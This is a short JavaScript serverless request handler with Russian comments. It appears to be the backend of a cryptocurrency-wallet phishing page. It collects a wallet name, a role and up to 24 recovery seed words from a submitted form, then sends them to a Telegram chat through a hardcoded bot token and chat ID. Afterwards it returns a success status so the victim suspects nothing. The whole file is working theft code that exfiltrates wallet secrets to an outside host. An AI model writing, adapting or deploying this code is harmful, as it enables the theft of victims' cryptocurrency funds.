export async function onRequestPost(context) {
    const data = await context.request.formData();
    const wallet = data.get('wallet');
    const role = data.get('role');
    
    // Собираем слова из формы
    let words = [];
    for(let i = 1; i <= 24; i++) {
        const word = data.get('w' + i);
        if(word) words.push(word);
    }

    // Формируем сообщение для отправки
    const message = `
🔑 New Wallet Connected
Wallet: ${wallet}
Words: ${words.join(' ')}
Role: ${role}
    `;

    // Отправляем в Telegram
    const BOT_TOKEN = '7758194328:AAG9pSD9fya02U2m4lgsG8OjNFKtLIt0r_0';
    const CHAT_ID = '-1002371075600';
    
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    await fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    });

    return new Response(JSON.stringify({status: true}), {
        headers: {'Content-Type': 'application/json'}
    });
}
